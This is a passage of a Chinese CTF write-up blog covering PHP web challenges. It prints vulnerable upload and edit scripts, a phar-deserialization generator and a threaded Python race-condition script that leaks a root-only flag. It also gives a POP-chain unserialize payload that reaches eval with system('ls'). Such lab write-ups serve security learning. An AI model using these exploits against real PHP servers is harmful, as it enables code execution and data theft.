class="code"><pre><span class="line"><span class="keyword">FROM</span> php:<span class="number">7.2</span>.<span class="number">3</span>-fpm</span><br><span class="line"></span><br><span class="line"><span class="keyword">COPY</span><span class="language-bash"> files /tmp/files/</span></span><br><span class="line"><span class="keyword">COPY</span><span class="language-bash"> src /var/www/html/</span></span><br><span class="line"><span class="keyword">COPY</span><span class="language-bash"> flag /flag</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> <span class="built_in">chown</span> -R root:root /var/www/html/ &amp;&amp; \</span></span><br><span class="line"><span class="language-bash">    <span class="built_in">chmod</span> -R 755 /var/www/html &amp;&amp; \</span></span><br><span class="line"><span class="language-bash">    <span class="built_in">chown</span> -R www-data:www-data /var/www/html/uploads &amp;&amp; \</span></span><br><span class="line"><span class="language-bash">    sed -i <span class="string">&#x27;s/deb.debian.org/mirrors.aliyun.com/g&#x27;</span> /etc/apt/sources.list &amp;&amp; \</span></span><br><span class="line"><span class="language-bash">    sed -i <span class="string">&#x27;/security/d&#x27;</span> /etc/apt/sources.list &amp;&amp; \</span></span><br><span class="line"><span class="language-bash">    apt-get update &amp;&amp; \</span></span><br><span class="line"><span class="language-bash">    apt-get install nginx -y &amp;&amp; \</span></span><br><span class="line"><span class="language-bash">    /bin/mv -f /tmp/files/default  /etc/nginx/sites-available/default &amp;&amp; \</span></span><br><span class="line"><span class="language-bash">    gcc /tmp/files/copyflag.c -o /copyflag &amp;&amp; \</span></span><br><span class="line"><span class="language-bash">    <span class="built_in">chmod</span> 4711 /copyflag &amp;&amp; \</span></span><br><span class="line"><span class="language-bash">    <span class="built_in">rm</span> -rf /tmp/files &amp;&amp; \</span></span><br><span class="line"><span class="language-bash">    <span class="built_in">rm</span> -rf /var/lib/apt/lists/* &amp;&amp; \</span></span><br><span class="line"><span class="language-bash">    <span class="built_in">chmod</span> 700 /flag</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">CMD</span><span class="language-bash"> nginx&amp;&amp;php-fpm</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">EXPOSE</span> <span class="number">80</span></span><br></pre></td></tr></table></figure><p>似乎没有太多重要的信息，回头看首页源码</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">当前头像：</span><br><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">width</span>=<span class="string">&quot;50px&quot;</span> <span class="attr">height</span>=<span class="string">&quot;50px&quot;</span> <span class="attr">src</span>=<span class="string">&quot;uploads/head.png&quot;</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">br</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;upload.php&quot;</span> <span class="attr">method</span>=<span class="string">&quot;post&quot;</span> <span class="attr">enctype</span>=<span class="string">&quot;multipart/form-data&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">p</span>&gt;</span><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;file&quot;</span> <span class="attr">name</span>=<span class="string">&quot;file&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">p</span>&gt;</span><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">value</span>=<span class="string">&quot;上传头像&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">br</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;edit.php&quot;</span> <span class="attr">method</span>=<span class="string">&quot;post&quot;</span> <span class="attr">enctype</span>=<span class="string">&quot;application/x-www-form-urlencoded&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">p</span>&gt;</span><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">name</span>=<span class="string">&quot;png&quot;</span> <span class="attr">value</span>=<span class="string">&quot;2.png&quot;</span> <span class="attr">hidden</span>=<span class="string">&quot;1&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">p</span>&gt;</span><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">name</span>=<span class="string">&quot;flag&quot;</span> <span class="attr">value</span>=<span class="string">&quot;flag&#123;x&#125;&quot;</span> <span class="attr">hidden</span>=<span class="string">&quot;1&quot;</span> &gt;</span><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--    &lt;p&gt;&lt;input type=&quot;submit&quot; value=&quot;更换头像&quot;&gt;&lt;/p&gt; --&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>被注释掉的<strong>submit</strong>十分可疑，取消注释后点击抓个包</p><p><img src="/images/BUU/20220503192134.png"></p><p>结合描述似乎能任意文件读取欸，但是flag权限又是700，多半是寄了</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">POST <span class="attribute">png</span>=/flag&amp;flag=whatever</span><br></pre></td></tr></table></figure><p><img src="/images/BUU/20220503192551.png"></p><p>哎呀这不403吗 看一下远方的源码吧佳人们</p><p><strong>upload.php</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">isset</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;请上传头像&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$file</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line"><span class="variable">$filename</span> = <span class="title function_ invoke__">md5</span>(<span class="string">&quot;png&quot;</span>.<span class="variable">$file</span>[<span class="string">&#x27;name&#x27;</span>]).<span class="string">&quot;.png&quot;</span>;</span><br><span class="line"><span class="variable">$path</span> = <span class="string">&quot;uploads/&quot;</span>.<span class="variable">$filename</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$file</span>[<span class="string">&#x27;tmp_name&#x27;</span>],<span class="variable">$path</span>))&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;上传成功： &quot;</span>.<span class="variable">$path</span>;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p><strong>edit.php</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">ini_set</span>(<span class="string">&quot;error_reporting&quot;</span>,<span class="string">&quot;0&quot;</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">flag</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">copyflag</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="title function_ invoke__">exec</span>(<span class="string">&quot;/copyflag&quot;</span>); <span class="comment">//以root权限复制/flag 到 /tmp/flag.txt，并chown www-data:www-data /tmp/flag.txt</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;SFTQL&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">copyflag</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filewrite</span>(<span class="params"><span class="variable">$file</span>,<span class="variable">$data</span></span>)</span>&#123;</span><br><span class="line">        <span class="title function_ invoke__">unlink</span>(<span class="variable">$file</span>);</span><br><span class="line">        <span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$file</span>, <span class="variable">$data</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;png&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$filename</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;png&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/:|phar|\/\/|php/im&quot;</span>,<span class="variable">$filename</span>))&#123;</span><br><span class="line">        <span class="variable">$f</span> = <span class="title function_ invoke__">fopen</span>(<span class="variable">$filename</span>,<span class="string">&quot;r&quot;</span>);</span><br><span class="line">        <span class="variable">$contents</span> = <span class="title function_ invoke__">fread</span>(<span class="variable">$f</span>, <span class="title function_ invoke__">filesize</span>(<span class="variable">$filename</span>));</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">strpos</span>(<span class="variable">$contents</span>,<span class="string">&quot;flag&#123;&quot;</span>) !== <span class="literal">false</span>)&#123;</span><br><span class="line">            <span class="title function_ invoke__">filewrite</span>(<span class="variable">$filename</span>,<span class="string">&quot;Don&#x27;t give me flag!!!&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;flag&#x27;</span>])) &#123;</span><br><span class="line">        <span class="variable">$flag</span> = (<span class="keyword">string</span>)<span class="variable">$_POST</span>[<span class="string">&#x27;flag&#x27;</span>];</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$flag</span> == <span class="string">&quot;Give me flag&quot;</span>) &#123;</span><br><span class="line">            <span class="title function_ invoke__">filewrite</span>(<span class="string">&quot;/tmp/flag.txt&quot;</span>, <span class="string">&quot;Don&#x27;t give me flag&quot;</span>);</span><br><span class="line">            <span class="title function_ invoke__">sleep</span>(<span class="number">2</span>);</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;no no no !&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="title function_ invoke__">filewrite</span>(<span class="string">&quot;/tmp/flag.txt&quot;</span>, <span class="variable">$flag</span>);  <span class="comment">//不给我看我自己写个flag。</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable">$head</span> = <span class="string">&quot;uploads/head.png&quot;</span>;</span><br><span class="line">        <span class="title function_ invoke__">unlink</span>(<span class="variable">$head</span>);</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">symlink</span>(<span class="variable">$filename</span>, <span class="variable">$head</span>)) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;成功更换头像&quot;</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="title function_ invoke__">unlink</span>(<span class="variable">$filename</span>);</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;非正常文件，已被删除&quot;</span>;</span><br><span class="line">        &#125;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>关注<code>symunlink()</code>能利用<code>php://phar</code>协议打phar反序列化，触发<code>flag::__destruct</code>带出flag到<code>/tmp/flag.txt</code>。但由于文件查看始终只能在<code>./upload/head.png</code>页面，因此得把flag也link过来。</p><p>问题就出在这两次<code>filewrite()</code>，flag文件显然会被<code>filewrite()</code>给重写两回啊两回（悲）。因此得利用条件竞争<strong>让flag在被重写后、link前的瞬间再次生成flag文件</strong>将其覆盖，这样<code>symlink()</code>过来的就是真正的flag了。</p><p>先生成phar文件</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">flag</span></span>&#123;&#125;</span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title function_ invoke__">flag</span>();</span><br><span class="line"><span class="variable">$phar</span> = <span class="keyword">new</span> <span class="title class_">Phar</span>(<span class="string">&quot;flag.phar&quot;</span>);</span><br><span class="line"><span class="variable">$phar</span> -&gt; <span class="title function_ invoke__">startBuffering</span>();</span><br><span class="line"><span class="variable">$phar</span> -&gt; <span class="title function_ invoke__">setStub</span>(<span class="string">&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;</span>);</span><br><span class="line"><span class="variable">$phar</span> -&gt; <span class="title function_ invoke__">setMetadata</span>(<span class="variable">$a</span>); </span><br><span class="line"><span class="variable">$phar</span> -&gt; <span class="title function_ invoke__">addFromString</span>(<span class="string">&quot;flag.txt&quot;</span>,<span class="string">&quot;flag&quot;</span>);</span><br><span class="line"><span class="variable">$phar</span> -&gt; <span class="title function_ invoke__">stopBuffering</span>();</span><br></pre></td></tr></table></figure><p>将其上传，之后运行脚本触发竞争</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://912f9400-ae0c-4c61-ba3d-b640de03e880.node4.buuoj.cn:81/&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">flagtohead</span>():</span><br><span class="line">    data = &#123;<span class="string">&quot;flag&quot;</span>: <span class="string">&quot;233&quot;</span>, <span class="string">&quot;png&quot;</span>: <span class="string">&quot;/tmp/flag.txt&quot;</span>&#125;</span><br><span class="line">    requests.post(url=url + <span class="string">&quot;/edit.php&quot;</span>, data=data)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">linkphar</span>():</span><br><span class="line">    data = &#123;<span class="string">&quot;flag&quot;</span>: <span class="string">&quot;233&quot;</span>, <span class="string">&quot;png&quot;</span>: <span class="string">&quot;phar://uploads/a265d9cf18104aecd330627f7c1bb7be.png&quot;</span>&#125;</span><br><span class="line">    requests.post(url=url + <span class="string">&quot;/edit.php&quot;</span>, data=data)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">getflag</span>():</span><br><span class="line">    <span class="built_in">print</span>(requests.get(url + <span class="string">&quot;/uploads/head.png&quot;</span>).text)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">    threading.Thread(target=flagtohead).start()</span><br><span class="line">    threading.Thread(target=linkphar).start()</span><br><span class="line">    threading.Thread(target=getflag).start()</span><br><span class="line">    time.sleep(<span class="number">1</span>)</span><br></pre></td></tr></table></figure><p><img src="/images/BUU/20220504153743.png"></p><h1 id="good-luck"><a href="#good-luck" class="headerlink" title="good_luck"></a>good_luck</h1><p>checksec</p><p><img src="/images/BUU/20220429182229.png"></p>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;warmup-php&quot;&gt;&lt;a href=&quot;#warmup-php&quot; class=&quot;headerlink&quot; title=&quot;warmup-php&quot;&gt;&lt;/a&gt;warmup-php&lt;/h1&gt;&lt;p&gt;&lt;a href=&quot;https://files.buuoj.cn/files/45743698d2fda6f2ee15021bcb38f6f4/2.zip&quot;&gt;题目附件&lt;/a&gt;给了四个&lt;code&gt;class&lt;/code&gt;源码文件，&lt;code&gt;Base&lt;/code&gt;，&lt;code&gt;Filter extends Base&lt;/code&gt;，&lt;code&gt;ListView extends Base&lt;/code&gt;，&lt;code&gt;TestView extends ListView&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;首先在&lt;code&gt;Base&lt;/code&gt;类中找到漏洞点&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;/images/BUU/20220427220530.png&quot;&gt;&lt;/p&gt;
&lt;p&gt;似乎有&lt;code&gt;eval()&lt;/code&gt;和&lt;code&gt;call_user_func_array()&lt;/code&gt;两个方向，也不清楚哪个能打通的说&lt;/p&gt;</summary>
    
    
    
    
    <category term="php" scheme="https://www.m0x01sery.com/tags/php/"/>
    
    <category term="upload" scheme="https://www.m0x01sery.com/tags/upload/"/>
    
    <category term="race condition" scheme="https://www.m0x01sery.com/tags/race-condition/"/>
    
  </entry>
  
  <entry>
    <title>DASCTF X SU 三月春季挑战赛 web</title>
    <link href="https://www.m0x01sery.com/2022/04/13/[DASCTF-SU]all-web/"/>
    <id>https://www.m0x01sery.com/2022/04/13/[DASCTF-SU]all-web/</id>
    <published>2022-04-12T16:00:00.000Z</published>
    <updated>2022-04-12T16:00:00.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="ezpop"><a href="#ezpop" class="headerlink" title="ezpop"></a>ezpop</h1><span id="more"></span><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">crow</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$v1</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$v2</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">eval</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="keyword">new</span> <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">v1</span>(<span class="variable">$this</span>-&gt;v2);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;v1-&gt;<span class="title function_ invoke__">world</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">fin</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$f1</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;f1 . <span class="string">&#x27;114514&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">run</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        (<span class="variable language_">$this</span>-&gt;f1)();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$a</span>, <span class="variable">$b</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;f1-&gt;<span class="title function_ invoke__">get_flag</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">what</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$a</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;a-&gt;<span class="title function_ invoke__">run</span>();</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;hello&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">mix</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$m1</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">run</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        (<span class="variable language_">$this</span>-&gt;m1)();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">get_flag</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="string">&#x27;#&#x27;</span> . <span class="variable language_">$this</span>-&gt;m1);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;cmd&#x27;</span>])) &#123;</span><br><span class="line">    <span class="title function_ invoke__">unserialize</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;cmd&#x27;</span>]);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>热身题 链子如下</p><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">fin::__destruct</span><br><span class="line">what::__toString</span><br><span class="line">mix::run</span><br><span class="line">crow::__invoke</span><br><span class="line">fin::__call</span><br><span class="line">mix::get_flag</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">crow</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$v1</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$v2</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">fin</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$f1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">what</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$a</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">mix</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$m1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$f1</span> = <span class="keyword">new</span> <span class="title function_ invoke__">fin</span>();</span><br><span class="line"><span class="variable">$w</span> = <span class="keyword">new</span> <span class="title function_ invoke__">what</span>();</span><br><span class="line"><span class="variable">$m1</span> = <span class="keyword">new</span> <span class="title function_ invoke__">mix</span>();</span><br><span class="line"><span class="variable">$c</span> = <span class="keyword">new</span> <span class="title function_ invoke__">crow</span>();</span><br><span class="line"><span class="variable">$f2</span> = <span class="keyword">new</span> <span class="title function_ invoke__">fin</span>();</span><br><span class="line"><span class="variable">$m2</span> = <span class="keyword">new</span> <span class="title function_ invoke__">mix</span>();</span><br><span class="line"></span><br><span class="line"><span class="variable">$f1</span>-&gt;f1 = <span class="variable">$w</span>;</span><br><span class="line"><span class="variable">$w</span>-&gt;a = <span class="variable">$m1</span>;</span><br><span class="line"><span class="variable">$m1</span>-&gt;m1 = <span class="variable">$c</span>;</span><br><span class="line"><span class="variable">$c</span>-&gt;v1 = <span class="variable">$f2</span>;</span><br><span class="line"><span class="variable">$f2</span>-&gt;f1 = <span class="variable">$m2</span>;</span><br><span class="line"><span class="variable">$m2</span>-&gt;m1=<span class="string">&quot;?&gt;&lt;?php system(&#x27;ls&#x27;);?&gt;&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ 